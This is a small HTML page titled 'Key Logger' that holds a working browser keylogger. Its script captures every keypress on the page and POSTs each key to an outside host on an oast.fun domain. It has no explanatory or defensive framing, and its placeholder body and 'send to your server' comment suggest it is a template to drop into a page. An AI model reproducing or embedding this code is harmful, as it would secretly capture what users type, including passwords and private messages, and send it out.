<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Logger</title>
    <script>
        document.addEventListener('keypress', function(event) {
            var key = event.key;
            sendToServer(key);
        });

        function sendToServer(key) {
            // Send the key to your server
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/log', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({ key: key }));
        }
    </script>
</head>
<body>
    <!-- Your HTML content here -->
</body>
</html>
